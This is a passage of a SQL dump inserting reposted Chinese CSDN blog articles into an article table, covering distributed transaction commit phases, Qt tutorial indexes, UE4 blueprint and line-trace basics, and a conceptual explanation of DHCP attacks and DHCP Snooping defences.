/>PreCommit阶段：协调者根据参与者的反应情况，并以此来决定是否可以进行事务的PreCommit操作。首先，协调者向参与者发送PreCommit请求，并进入Prepared阶段；当参与者接收到PreCommit请求后，会执行事务操作，并将undo和redo信息记录到事务日志中，如果参与者成功的执行了事务操作，则返回ACK响应，同时开始等待最终指令：提交（Commit）或中止（abort）如果在过程中，存在参与者向协调者发送了No响应，或者等待超时之后，协调者都没有接到参与者的响应，那么就执行事务的中断。<br />doCommit阶段：该阶段进行真正的事务提交，总的来说，也可以分为两个过程，参与者确认可以提交时进入提交状态并向协调者发出提交申请，协调者在收到所有参与者的请求后会做出响应，事务提交，如果存在有参与者没有完成提交申请，则所有参与者事务都会进行回滚。<br />六、总结<br />对于单体系统，应该要了解事务的实现需要数据库事务的支持，而对于数据库事务首先应该要了解当前数据库所使用的的隔离级别，不同的隔离级别之间的本质不同，再往上则需要了解Spring事务的传播特性，以及其内部实现与大致原理。而对于分布式系统间的事务需求，从本质上仍然是需要保证数据的一致性，但同时也要求要保证可用性，折中的方案是基于BASE理论的消息事务结合重试来保证数据最终一致性，同时，满足可用性的需求，但需要注意的我们应该避免在本地事务中使用RPC或者消息，可能出现的情况是由于网络原因导致的超时，本地事务回滚但被调用方或消息消费者的流程已经执行成功，造成数据的不一致。<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「Coder!」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/m0_48806611/article/details/121720479</p>', '', 2, ',7,13,', '原创', '公开', '已发布', '', 654, '', '', 0, '2021-12-05 22:12:19', '2021-12-05 22:12:19');
INSERT INTO `article` VALUES (21, '《Qt 实战一二三》', 16, '概述', '<p>&ldquo;我们来自 Qt 技术交流，我们来自 QML 技术交流&rdquo;，不管你是笑了，还是笑了，反正我们是认真的。我们就是要找寻一种 Hold 不住的状态，来开始每一天的点滴分享，我们是一个有激情，有态度的部队。</p>\n<p>但是我们还是我们，我们只是多了一份责任。古语有云：&ldquo;不积跬步无以至千里，不积小流无以成江海&rdquo;，所以每一个伟大事务的产生都不是一蹴而就的。现在我们要立足眼下，把第一站放在地球，&ldquo;《Qt 实战一二三》&rdquo;应运而生。</p>\n<p>这里，我们不扯淡，只谈技术、只交流、只分享。大胆的把你的问题、建议与意见说出来！不说，憋坏了怎么办？</p>\n<p>| 版权声明：一去、二三里，未经博主允许不得转载。</p>\n<p>关于命名<br />关于 Qt 系列命名，之前想了很久，想给它一个属于它自己的名字，但妄图用几个字来概括一个系列的难度，几乎不亚于重写几篇文章。</p>\n<p>早上，把我的想法说出来的时候，foruok 大神的一句&ldquo;《Qt 实战一二三》&rdquo;让我灵光一闪，那一刹那，说是醍醐灌顶也不为过，我和小伙伴们几乎同时兴奋的说，不如就用这个。</p>\n<p>多美妙的一句话，和我的名字一样 - 一去丶二三里，这几乎可以用来概括所有对于 Qt 实战方面的大大小小的困惑和不解。</p>\n<p>《Qt 实战一二三》<br />以下是《Qt 实战一二三》系列的目录结构，所有的代码都经过严格自测，并通过。我会尽可能的把所有的源码都放出来，供大家方便学习、交流。。。</p>\n<p>项目实战部分 - 主要是讲解平时在项目中遇到的大大小小的技术点。</p>\n<p>你关心的，才是我要分享的！！！</p>\n<p>资料大全<br />Qt 资料大全<br />环境与工具<br />关于 Qt<br />Qt 环境搭建（Visual Studio）<br />Qt 环境搭建（Qt Creator）<br />Qt5.7 + VS2015 环境搭建<br />Linux 下搭建 Qt 环境<br />Qt Creator 快捷键<br />Qt 之命令行编译（nmake）<br />Qt Creator 介绍<br />Qt Assistant 介绍<br />Qt Linguist 介绍<br />Qt 之 pro 配置多个子工程/子模块<br />Qt 之输出控制<br />查看和调试 Qt 源码<br />Qt Creator 添加自定义注释<br />qmake<br />Qt 之 pro 配置详解<br />Qt 之资源系统<br />Qt 之添加 Windows 资源文件（.rc文件）<br />Qt 之生成 Windows 资源文件（.rc 文件）<br />对象 &amp; 属性 &amp; 事件<br />Qt 之 Meta-Object 系统<br />Qt 之属性系统<br />Qt 之事件系统<br />Qt 之 Timers<br />Qt 之对象树与所有权<br />Qt 之 findChild<br />基本部件<br />QWidget、QDialog、QMainWindow 的异同点<br />Qt 之模式、非模式、半模式对话框<br />Qt 之 QLabel<br />Qt 之 QLCDNumber<br />Qt 之 QAbstractButton<br />Qt 之 QPushButton<br />Qt 之 QToolButton<br />Qt 之 QCheckBox<br />Qt 之 QRadioButton<br />Qt 之 QLineEdit<br />Qt 之 QSpinBox 和 QDoubleSpinBox<br />Qt 之 QSlider<br />Qt 之 QProgressBar<br />Qt 之 QDateTimeEdit<br />Qt 之 QDateEdit和QTimeEdit<br />Qt 之 QScrollArea<br />Qt 之 QToolBox<br />Qt 之 QSystemTrayIcon<br />布局管理器<br />Qt 之布局管理器<br />Qt 之自定义布局管理器（QCardLayout）<br />Qt 之自定义布局管理器（QFlowLayout）<br />Qt 之自定义布局管理器（QBorderLayout）<br />Qt 之手动布局<br />Qt 之水平/垂直布局（QBoxLayout、QHBoxLayout、QVBoxLayout）<br />Qt 之格栅布局（QGridLayout）<br />Qt 之表单布局（QFormLayout）<br />Qt 之 QStackedLayout<br />Qt 之 QStackedWidget<br />Qt 之 QSpacerItem<br />Qt 之 QSizePolicy<br />高级控件<br />对话框<br />国际化和翻译<br />Qt 之国际化<br />Qt 之国际化（系统文本 - QMessageBox 按钮、QLineEdit 右键菜单等）<br />Qt 翻译原生 widgets（QTextEdit 右键菜单等）<br />数据类型与数据操作类<br />Qt 之 QFileSystemWatcher<br />Qt 之 QDesktopServices<br />Qt 之 QTimer<br />Qt 之 QFileIconProvider<br />Qt 之 QTemporaryFile<br />Qt 之 QCryptographicHash<br />Qt 之 qInstallMessageHandler（输出详细日志）<br />Qt 之 qInstallMessageHandler（重定向至文件）<br />Qt 之 qSetMessagePattern<br />数据存储与获取<br />Qt 之界面数据存储与获取<br />事件<br />Qt 之 QEvent<br />QPainter 2D 图形<br />Qt 之坐标系统<br />Qt 之图形（QPainter 的基本绘图）<br />Qt 之图形（渐变填充）<br />Qt 之图形（转换）<br />Qt 之图形（绘制文本）<br />Qt 之图形（QPainterPath）<br />Qt 之描绘轮廓<br />Qt 之图形（组合）<br />Qt 之图形（绘制漂亮的圆弧）<br />Qt 之图形（简笔画-绘制漂亮的西瓜）<br />Qt 之图形（简笔画-绘制卡通蚂蚁）<br />Qt 之绘制时钟<br />Qt 之绘制闪烁文本<br />Images<br />Qt 之 QImageWriter<br />Qt 之 QImageReader<br />进程间通信<br />Qt 之进程间通信（IPC）<br />Qt 之进程间通信（Windows消息）<br />Qt 之进程间通信（共享内存）<br />Qt 之进程间通信（QProcess）<br />Qt 之进程间通信（TCP/IP）<br />自定义界面<br />Qt 之自定义界面（实现无边框、可移动）<br />Qt 之自定义界面（添加自定义标题栏）<br />Qt 之自定义界面（窗体缩放）<br />Qt 之自定义界面（窗体缩放-跨平台终极版）<br />Qt 之窗体拖拽、自适应分辨率、自适应大小<br />Qt 之自定义界面（QMessageBox）<br />Qt 之自定义界面（右下角冒泡）<br />Qt 之自定义控件（开关按钮）<br />Qt 之透明提示框<br />Qt 之自定义搜索框<br />Third-Party<br />Qt 使用第三方库<br />基于 Qt 的图表库<br />Qt 之 QuaZIP（zip压缩/解压缩）<br />Qt 之 OpenSSL<br />Qt 之 QtSoap（访问WebService）<br />Qt 之二维码扫描<br />Qt 之 QCustomPlot（图形库）<br />Qt 之 QRoundProgressBar（圆形进度条）<br />Qt 之 QProgressIndicator（等待提示框）<br />Qt 之 QScintilla（源代码编辑器）<br />项目实战<br />Qt 之 Tab 键切换焦点顺序<br />Qt 之密码框不可选中、复制、粘贴、无右键菜单等<br />QDialog 之屏蔽 Esc 键<br />Qt 之命令行参数<br />Qt 之重启应用程序<br />Qt 之 QFileIconProvider（根据扩展名获取文件图标、类型）<br />Qt 之根据扩展名获取文件图标、类型<br />Qt 之启动外部程序<br />Qt 之提取 exe/dll/icon 文件图标<br />Qt 之运行一个实例进程<br />Qt 之 QTableView添加复选框（QAbstractTableModel）<br />Qt 之 QTableView 添加复选框（QAbstractItemDelegate）<br />Qt 之 QHeaderView 添加复选框<br />Qt 之 QHeaderView 排序<br />Qt 之 QHeaderView自定义排序（QSortFilterProxyModel）<br />Qt 之 QHeaderView 自定义排序（终极版）<br />Qt 之 QHeaderView 自定义排序（获取正确的 QModelIndex）<br />Qt 之 QTableView 显示富文本<br />Qt 之模型/视图（自定义进度条）<br />Qt 之模型/视图（自定义按钮）<br />Qt 之显示网络图片<br />Qt 之滚动字幕<br />Qt 之保持 GUI 响应<br />Qt 之设置应用程序图标<br />Qt 之保存/恢复窗口的几何形状<br />Qt 之等待提示框（QPropertyAnimation）<br />Qt 之等待提示框（QTimer）<br />Qt 之等待提示框（QMovie）<br />Qt 之字典划词<br />Qt 之镜像旋转<br />Qt 之窗体透明<br />Qt 新版本<br />Qt5.7 新特性<br />共同进步<br />进步始于交流，收获源于分享。希望一起走过的日子里，我们能够更多地交流心得，共同进步 - You are not alone。</p>\n<p>亲们，记住呦，后期分享的所有内容都可以随时交流。欢迎大家留言，不要吝啬你们的建议与意见，收到后我会第一时间进行回复。</p>\n<p>青春不老，奋斗不止！纯正开源之美，有趣、好玩、靠谱。。。</p>\n<p>持续更新中&hellip;<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「一去丶二三里」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/liang19890820/article/details/50277095</p>', '', 3, ',12,', '原创', '公开', '已发布', '', 4981, '', '', 0, '2021-12-05 22:14:45', '2021-12-05 22:14:45');
INSERT INTO `article` VALUES (22, 'QT5编程入门教程（非常详细）', 16, '概述', '<blockquote>\n<p><img src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2MuYmlhbmNoZW5nLm5ldC91cGxvYWRzL2FsbGltZy8xODEyMjgvMS0xUTIyUjEzUUQwMi5naWY\" alt=\"Qt入门教程\" width=\"57\" height=\"68\" />Qt 是一个跨平台的 C++ 框架（C++库），目前最新的版本是 Qt5。Qt5 还包含了很多小版本，其中推荐&nbsp;<strong>Qt5.6</strong>&nbsp;或&nbsp;<strong>Qt5.9</strong>，这两个版本是 LTS 版本（即长期支持版本），Bug较少，相对稳定。</p>\n<p>Qt 除了支持界面设计（GUI编程），还封装了与网络编程、<a class=\"hl hl-1\" href=\"https://so.csdn.net/so/search?from=pc_blog_highlight&amp;q=%E5%A4%9A%E7%BA%BF%E7%A8%8B\" target=\"_blank\" rel=\"noopener\">多线程</a>、数据库连接、视频音频等相关的功能。</p>\n<p>这套 Qt 教程以 Qt 5.9 为基础来介绍 Qt 开发，配有精美的图片以及完整的示例程序，几乎涉及 Qt 编程的所有模块。</p>\n注意，本教程不再对 C++ 语法进行介绍，没有 C++ 基础的读者请猛击《&nbsp;<a href=\"http://c.biancheng.net/cplus/\">C++入门教程</a>》进行学习。</blockquote>\n<p>教程目录：</p>\n<p>1.&nbsp;<a href=\"http://c.biancheng.net/view/1792.html\">Qt是什么？Qt简介（非常全面）</a></p>\n<p>2.&nbsp;<a href=\"http://c.biancheng.net/view/3876.html\">Qt和其它GUI库的对比</a></p>\n<p>3.&nbsp;<a href=\"http://c.biancheng.net/view/3877.html\">学习QML还是C++？</a></p>\n<p>4.&nbsp;<a href=\"http://c.biancheng.net/view/3851.html\">Qt下载（多种下载通道+所有版本）</a></p>\n<p>5.&nbsp;<a href=\"http://c.biancheng.net/view/3858.html\">图解Qt安装（Windows平台）</a></p>\n<p>6.&nbsp;<a href=\"http://c.biancheng.net/view/3886.html\">图解Qt安装（Linux平台）</a></p>\n<p>7.&nbsp;<a href=\"http://c.biancheng.net/view/3901.html\">Linux Qt cannot find -lGL错误完美解决方案（亲测有效）</a></p>\n<p>8.&nbsp;<a href=\"http://c.biancheng.net/view/3866.html\">解密Qt安装目录的结构</a></p>\n<p>9.&nbsp;<a href=\"http://c.biancheng.net/view/3868.html\">认识一下Qt用到的开发工具</a></p>\n<p>10.&nbsp;<a href=\"http://c.biancheng.net/view/3871.html\">Qt编程涉及的术语和名词</a></p>\n<p>11.&nbsp;<a href=\"http://c.biancheng.net/view/1804.html\">Qt Creator的初步使用</a></p>\n<p>12.&nbsp;<a href=\"http://c.biancheng.net/view/1817.html\">编写第一个Qt程序</a></p>\n<p>13.&nbsp;<a href=\"http://c.biancheng.net/view/1818.html\">VS中使用Qt方法详解</a></p>\n<p>14.&nbsp;<a href=\"http://c.biancheng.net/view/1819.html\">Qt项目管理文件（.pro）及其作用详解</a></p>\n<p>15.&nbsp;<a href=\"http://c.biancheng.net/view/1820.html\">Qt项目界面文件（.ui）及其作用（超详细）</a></p>\n<p>16.&nbsp;<a href=\"http://c.biancheng.net/view/1821.html\">Qt项目中main主函数及其作用</a></p>\n<p>17.&nbsp;<a href=\"http://c.biancheng.net/view/1822.html\">Qt界面布局管理详解</a></p>\n<p>18.&nbsp;<a href=\"http://c.biancheng.net/view/1823.html\">Qt信号与槽机制详解</a></p>\n<p>19.&nbsp;<a href=\"http://c.biancheng.net/view/1824.html\">Qt纯代码设计UI实例分析</a></p>\n<p>20.&nbsp;<a href=\"http://c.biancheng.net/view/1825.html\">Qt Creator使用技巧</a></p>\n<p>21.&nbsp;<a href=\"http://c.biancheng.net/view/1826.html\">Qt元对象和属性系统详解</a></p>\n<p>22.&nbsp;<a href=\"http://c.biancheng.net/view/1827.html\">Qt全局变量、函数和宏定义详解</a></p>\n<p>23.&nbsp;<a href=\"http://c.biancheng.net/view/1831.html\">Qt顺序容器类和关联容器类详解</a></p>\n<p>24.&nbsp;<a href=\"http://c.biancheng.net/view/1839.html\">Qt迭代器（Java类型和STL类型）详解</a></p>\n<p>25.&nbsp;<a href=\"http://c.biancheng.net/view/1841.html\">Qt foreach关键字用法（无师自通）</a></p>\n<p>26.&nbsp;<a href=\"http://c.biancheng.net/view/1842.html\">Qt类库模块划分详解</a></p>\n<p>27.&nbsp;<a href=\"http://c.biancheng.net/view/1843.html\">Qt字符串与数字之间的转换方法详解</a></p>\n<p>28.&nbsp;<a href=\"http://c.biancheng.net/view/1844.html\">Qt QString类及常用函数功能详解</a></p>\n<p>29.&nbsp;<a href=\"http://c.biancheng.net/view/1845.html\">Qt QSpinBox使用详解</a></p>\n<p>30.&nbsp;<a href=\"http://c.biancheng.net/view/1846.html\">Qt数值输入组件和显示组件用法详解</a></p>\n<p>31.&nbsp;<a href=\"http://c.biancheng.net/view/1847.html\">Qt获取当前时间（超详细）</a></p>\n<p>32.&nbsp;<a href=\"http://c.biancheng.net/view/1848.html\">Qt定时器及实现（详解）</a></p>\n<p>33.&nbsp;<a href=\"http://c.biancheng.net/view/1849.html\">Qt QComboBox下拉框及用法（详解版）</a></p>\n<p>34.&nbsp;<a href=\"http://c.biancheng.net/view/1852.html\">Qt QPlainTextEdit用法详解</a></p>\n<p>35.&nbsp;<a href=\"http://c.biancheng.net/view/1854.html\">Qt QListWidget和QToolButton用法详解（实例分析）</a></p>\n<p>36.&nbsp;<a href=\"http://c.biancheng.net/view/1862.html\">Qt QTreeWidget和QDockWidget用法完全攻略（实例分析）</a></p>\n<p>37.&nbsp;<a href=\"http://c.biancheng.net/view/1863.html\">Qt QTableWidget及基本操作（详解版）</a></p>\n<p>38.&nbsp;<a href=\"http://c.biancheng.net/view/1864.html\">Qt Model/View（模型/视图）结构（无师自通）</a></p>\n<p>39.&nbsp;<a href=\"http://c.biancheng.net/view/1865.html\">Qt QFileSystemModel功能及用法详解</a></p>\n<p>40.&nbsp;<a href=\"http://c.biancheng.net/view/1868.html\">Qt QStringListModel用法详解</a></p>\n<p>41.&nbsp;<a href=\"http://c.biancheng.net/view/1869.html\">Qt QStandardItemModel用法（超级详细）</a></p>\n<p>42.&nbsp;<a href=\"http://c.biancheng.net/view/1870.html\">Qt 5种标准对话框及使用方法详解</a></p>\n<p>43.&nbsp;<a href=\"http://c.biancheng.net/view/1871.html\">Qt自定义对话框及调用方法（无师自通）</a></p>\n<p>44.&nbsp;<a href=\"http://c.biancheng.net/view/1874.html\">Qt多窗口编程详解</a></p>\n<p>45.&nbsp;<a href=\"http://c.biancheng.net/view/1875.html\">Qt MDI及其使用方法（详解版）</a></p>\n<p>46.&nbsp;<a href=\"http://c.biancheng.net/view/1876.html\">Qt Splash窗口设计（代码)实现详解</a></p>\n<p>47.&nbsp;<a href=\"http://c.biancheng.net/view/1877.html\">Qt读写文件（2种方式）实现详解</a></p>\n<p>48.&nbsp;<a href=\"http://c.biancheng.net/view/1879.html\">Qt二进制文件操作（读和写）详解</a></p>', '', 4, ',12,', '原创', '公开', '已发布', '', 3, '', '', 0, '2021-12-05 22:15:24', '2021-12-05 22:15:24');
INSERT INTO `article` VALUES (23, 'UE4蓝图基础', 16, '概述', '<p>UE4蓝图基础<br />Event/事件<br />Function/函数<br />Macro/宏<br />Variable/变量<br />流程控制节点<br />蓝图通信<br />Event/事件<br />EventBeginPlay:游戏开始时执行<br />EventTike:每帧执行<br />EventDestroyed:被销毁时执行事件<br />CustomEvent:自定义事件<br />事件可以使用set timer by event/设置定时器来执行委托<br />.</p>\n<p>Function/函数<br />Construction Script:构造函数，放置或修改蓝图时执行的函数</p>\n<p>函数可以有输入也有return/返回，但只有一个执行节点，并且有纯虚函数(没有执行接口)<br />.</p>\n<p>Macro/宏<br />宏可以有多个输入和输出，没有return节点，但输出节点相当于return，且宏不能被外部调用。</p>\n<p>&lt;蓝图函数库：Function Library &gt; &lt;蓝图宏库：MacroLibrary&gt; 可创建多个函数或宏全局使用<br />.</p>\n<p>Variable/变量<br />快捷键：按住Ctrl拖入/获取变量；按住Alt拖入/设置变量<br />变量可以通过To&hellip;转换类型；<br />点开小眼睛：可在每个蓝图实例上更改；<br />生成时公开：可在spawn时让此变量公开为引脚；<br />向过场动画公开：可在Level Sequence中进行修改</p>\n<p>Array/数组: 多个同一类型的容器</p>\n<p>映射：是一种关联容器,每个键都关联着一个元素（中的键类似数组中的索引）</p>\n<p>集合：一个集合表示了一组互不重复的数据元素。</p>\n<p>Struct/结构体<br />可以使用Struct 封装多种相同或不同类型的数据，可使用数组保存结构体，通过遍历数组中的结构体，来访问结构体数据并统计。</p>\n<p><br />Enum/枚举<br />可用于分类</p>\n<p>DataTable/数据表格<br />需要基于结构体创建；可将Excel数据导入数据表格DataTable使用（创建Excel表格对照DataTable制作，然后另存为CSV格式，导入到UE4选择对应的结构体就可使用，中文无法识别可将表格用VS转换成UTF-8编码格式）</p>\n<p>.</p>\n<p>流程控制节点<br />For/循环:</p>\n<p><br />Delay/延时：</p>\n<p>Do/执行：</p>\n<p><br />If/Sequence/FlipFlop/MultiGate/Gate/Switch/Select（常用）</p>\n<p>.</p>\n<p>蓝图通信<br />通过查找和类型转换实现通信</p>\n<p><br />Interface/蓝图接口<br />在接口中创建函数，执行接口函数的actor需要在类设置中添加该接口，其他actor可直接调用无需添加。<br />EventDispatcher/事件分发器</p>\n<p>当[Event Dispatchers]创建后，就可绑定一个事件，也可以绑定多个事件。当我们在蓝图中去调用[Event Dispatchers]那么与只相连的所有的绑定所有事件都会被触发。</p>\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「码出尖叫」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/weixin_44204664/article/details/111027601</p>', '', 5, ',12,', '原创', '公开', '已发布', '', 1651, '', '', 0, '2021-12-05 22:20:03', '2021-12-05 22:20:03');
INSERT INTO `article` VALUES (24, 'UE4Trace/追踪、检测（制作鼠标射线检测）', 13, '概述', '<p>Trace/追踪、检测<br />检测方式有好些，一般常用的射线检测和盒体检测；用法都差不多。</p>\n<p>以射线检测为例：两种射线检测指定的类别不一样<br />LineTraceSingleByChannel:是通过Channel进行查询<br />LineTraceSingleByObjectType:通过ObjectType进行查询<br />此处的Channel指的是CollisionResponses，而ObjectType指的是碰撞中的Object Type设置</p>\n<p><br />用LineTraceByhCannel做一个鼠标左键单击射线检测</p>\n<p>首先需要显示出光标：</p>\n<p>单击鼠标左键时生成一条鼠标点击位置方向的射线，在碰撞到的第一个actor时打印其名称。<br />ConvertMouseLocationToWorldSpace:将鼠标屏幕2D位置转换为场景空间3D位置和方向</p>\n<p>可通过Project Settings中的Collision界面新增Channel</p>\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「码出尖叫」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/weixin_44204664/article/details/111043825</p>', '', 6, ',12,', '原创', '公开', '已发布', '', 8, '', '', 0, '2021-12-05 22:20:55', '2021-12-05 22:20:55');
INSERT INTO `article` VALUES (25, 'ue4 检测通道trace channel与射线检测linetracebychannel', 13, '概述', '<p>1、这个需要添加trace channels，设置&mdash;项目设置&mdash;&mdash;引擎&mdash;&mdash;trace channels，新建检测通道，检测通道的名称叫tracechannel_1。</p>\n<p>2、角色蓝图中，获取摄像机的场景位置和获取向前的向量（要乘以500，以为向量取值范围是-1到1），两者想加作为射线检测的终点。</p>\n<p>这样就能发出检测射线。</p>\n<p>3、被检测到物体发出响应。响应的时候hitactor作为接口通信的目标。注意通信的蓝图类需要添加接口，碰撞盒子必须碰撞预设设成自定义custom。检测通道设置成阻挡。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p><br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「Growthofnotes」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/Growthofnotes/article/details/120223358</p>', '', 7, ',12,', '原创', '公开', '已发布', '', 0, '', '', 0, '2021-12-05 22:21:20', '2021-12-05 22:21:20');
INSERT INTO `article` VALUES (26, '[ 网络协议篇 ] 一篇文章让你掌握神秘的 DHCP(二)', 10, '概述', '<p>[ 网络模型篇 ]大白话告诉你什么是OSI七层模型</p>\n<p>[ 网络协议篇 ] 一篇文章让你掌握神秘的 ACL</p>\n<p>[ 网络协议篇 ] 一篇文章让你掌握神秘的 NAT</p>\n<p>[ 网络协议篇 ] 一篇文章让你掌握神秘的 DHCP(一)</p>\n<p>[ 应急响应 ]服务器(电脑)受到攻击该如何处理?(三)</p>\n<p>目录</p>\n<p>上篇回顾：</p>\n<p>DHCP 攻击及其防范</p>\n<p>1.DHCP Server仿冒者攻击</p>\n<p>攻击原理</p>\n<p>解决方法：</p>\n<p>2.仿冒DHCP报文攻击：</p>\n<p>攻击原理：</p>\n<p>解决方法：</p>\n<p>3.DHCP Server服务拒绝攻击：</p>\n<p>攻击原理：</p>\n<p>解决方法：</p>\n<p>DHCP Snooping（DHCP监听）简介</p>\n<p>DHCP监听作用</p>\n<p>DHCP Snooping（DHCP监听）原理描述</p>\n<p>DHCP监听将交换机端口划分为两类：</p>\n<p>两种端口的功能</p>\n<p>DHCP Snooping Binding（DHCP监听表）</p>\n<p>DHCP Snooping支持的Option82功能：</p>\n<p>概述：</p>\n<p>注意：</p>\n<p>Option82两个常用子选项</p>\n<p>实现方式：</p>\n<p>DHCP响应报文中有Option82选项情况：</p>\n<p>写在最后</p>\n<p>上篇回顾：<br />详细介绍了DHCP的基本概念，作用，报文类型，报文格式，端口，角色等</p>\n<p>详细介绍了DHCP的工作原理</p>\n<p>详细介绍了DHCP的优缺点</p>\n<p>详细介绍了DHCP的配置方法</p>\n<p>本文我们介绍DHCP的一些安全问题以及DHCP的安全机制（DHCP Snooping）</p>\n<p>DHCP 攻击及其防范<br />1.DHCP Server仿冒者攻击<br />攻击原理<br />由于DHCP Server和DHCP Client之间没有认证机制，所以如果在网络上随意添加一台DHCP服务器，它就可以为客户端分配IP地址以及其他网络参数。</p>\n<p>如果该DHCP服务器为用户分配错误的IP地址和其他网络参数，将会对网络造成非常大的危害。</p>\n<p>解决方法：<br />配置设备接口的&ldquo;信任（Trusted）/非信任（Untrusted）&rdquo;工作模式。</p>\n<p>将与合法DHCP服务器直接或间接连接的接口设置为信任接口，其他接口设置为非信任接口。</p>\n<p>从&ldquo;非信（Untrusted）&rdquo;接口上收到的DHCP回应报文将被直接丢弃，这样可以有效防止DHCP Server仿冒者的攻击。</p>\n<p>2.仿冒DHCP报文攻击：<br />攻击原理：<br />已获取到IP地址的合法用户通过向服务器发送DHCP Request或DHCP Release报文用以续租或释放IP地址。</p>\n<p>1.如果攻击者冒充合法用户不断向DHCP Server发送DHCP Request报文来续租IP地址，会导致这些到期的IP地址无法正常回收，以致一些合法用户不能获得IP地址；</p>\n<p>2.若攻击者仿冒合法用户的DHCP Release报文发往DHCP Server，将会导致用户异常下线。</p>\n<p>解决方法：<br />为了有效的防止仿冒DHCP报文攻击，可利用DHCP Snooping绑定表的功能。</p>\n<p>设备通过将DHCP Request续租报文和DHCP Release报文与绑定表进行匹配操作能够有效的判别报文是否合法（主要是检查报文中的VLAN、IP、MAC、接口信息是否匹配动态绑定表），若匹配成功则转发该报文，匹配不成功则丢弃。</p>\n<p>3.DHCP Server服务拒绝攻击：<br />攻击原理：<br />1. 设备某个接口下存在大量攻击者恶意申请IP地址，会导致DHCP Server中IP地址快速耗尽而不能为其他合法用户提供IP地址分配服务。</p>\n<p>2. 另一方面，DHCP Server通常仅根据DHCP Request报文中的CHADDR（Client Hardware Address）字段来确认客户端的MAC地址。如果某一攻击者通过不断改变CHADDR字段向DHCP Server申请IP地址，同样将会导致DHCP Server上的地址池被耗尽，从而无法为其他正常用户提供IP地址。</p>\n<p>DHCP拒绝服务攻击攻击可以是纯粹的DOS攻击，也可以与伪造的DHCP服务器配合使用。当正常的DHCP服务器瘫痪时，攻击者就可以建立伪造的DHCP服务器来为局域网中的客户端提供地址，使它们将信息转发给准备截取的恶意计算机。</p>\n<p>甚至即使DHCP请求报文的源MAC地址和CHADDR字段都是正确的，但由于DHCP请求报文是广播报文，如果大量发送的话也会耗尽网络带宽，形成另一种拒绝服务攻击。</p>\n<p>解决方法：<br />抑制大量DHCP用户恶意申请IP地址</p>\n<p>1. 开启设备的DHCP Snooping功能，可配置设备或接口允许接入的最大DHCP用户数，当接入的用户数达到该值时，则不再允许任何用户通过此设备或接口成功申请到IP地址。</p>\n<p>2. 而对通过改变DHCP Request报文中的CHADDR字段方式的攻击，可使能设备检测DHCP Request报文帧头MAC与DHCP数据区中CHADDR字段是否一致功能，此后设备将检查上送的DHCP Request报文中的帧头MAC地址是否与CHADDR值相等，相等则转发，否则丢弃。</p>\n<p>配置DHCP Snooping的攻击防范功能：</p>\n<p>1. 配置DHCP Snooping的一些功能，防范DHCP的各种攻击</p>\n<p>2. 配置接口的信任状态，以保证客户端从合法的服务器获取IP地址。（防范DHCP Server仿冒者攻击）</p>\n<p>3. ARP与DHCP Snooping的联动功能，保证DHCP用户在异常下线时实时更新绑定表。</p>\n<p>4. 对DHCP报文进行绑定表匹配检查的功能。（防止仿冒DHCP报文攻击）</p>\n<p>5. 配置允许接入的最大用户数以及使能检测DHCP Request报文帧头MAC与DHCP数据区中CHADDR字段是否一致功能。（防止DHCP Server服务拒绝攻击）</p>\n<p>6. 配置丢弃报文告警和报文限速告警功能。</p>\n<p>DHCP Snooping（DHCP监听）简介<br />DHCP Snooping是DHCP（Dynamic Host Configuration Protocol）的一种安全特性，用于保证DHCP客户端从合法的DHCP服务器获取IP地址，并记录DHCP客户端IP地址与MAC地址等参数的对应关系，防止网络上针对DHCP攻击。</p>\n<p>目前DHCP协议（RFC2131）在应用的过程中遇到很多安全方面的问题，网络中存在一些针对DHCP的攻击，如DHCP Server仿冒者攻击、DHCP Server的拒绝服务攻击、仿冒DHCP报文攻击等。</p>\n<p>为了保证网络通信业务的安全性，可引入DHCP Snooping技术，在DHCP Client和DHCP Server之间建立一道防火墙，以抵御网络中针对DHCP的各种攻击。</p>\n<p>DHCP监听作用<br />设备具有防御网络上DHCP攻击的能力，增强了设备的可靠性，保障通信网络的正常运行。通过这种特性，交换机能够拦截第二层VLAN域内的所有DHCP报文。</p>\n<p>为用户提供更安全的网络环境，更稳定的网络服务。</p>\n<p>DHCP Snooping（DHCP监听）原理描述<br />DHCP监听将交换机端口划分为两类：<br />信任端口：正常接收DHCP服务器响应的DHCP ACK、DHCP NAK和DHCP Offer报文。</p>\n<p>连接合法DHCP服务器的端口或者连接汇聚交换机的上行端口。</p>\n<p>非信任端口：只能够发送DHCP请求，丢弃来自非信任端口的所有其它DHCP报文。</p>\n<p>通常为连接终端设备的端口，如PC，网络打印机等。</p>\n<p>两种端口的功能<br />信任端口功能：</p>\n<p>通过开启DHCP Snooping特性，交换机限制非信任端口（用户端口）只能够发送DHCP请求，丢弃来自用户端口的所有其它DHCP报文，例如DHCP Offer报文等。</p>\n<p>而且并非所有来自非信任端口的DHCP请求都被允许通过，</p>\n<p>交换机还会比较DHCP 